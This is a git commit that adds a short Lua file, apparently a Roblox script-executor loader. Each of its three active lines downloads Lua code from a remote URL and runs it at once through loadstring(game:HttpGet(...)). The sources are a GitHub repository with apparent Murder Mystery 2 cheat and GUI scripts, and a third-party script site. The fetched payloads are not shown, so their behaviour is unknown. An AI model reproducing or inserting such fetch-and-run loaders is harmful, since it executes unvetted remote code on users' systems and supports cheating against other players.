e7df8bbd574cdfc0ce18c907d1647d4df16358b5
createdreallol <116285995+createdreallol@users.noreply.github.com>
2026-04-05 21:59:21 -0400

    Create test.lua

---
+++ test.lua
@@ -0,0 +1,11 @@
+	print("It worked...")
+    wait(20)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/createdreallol/yessuh/refs/heads/main/mm2.lua"))()
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/createdreallol/yessuh/refs/heads/main/gui.lua"))()
+end)
+
+pcall(function()
+    loadstring(game:HttpGet('https://raw.smokingscripts.org/vertex.lua'))()
+end)
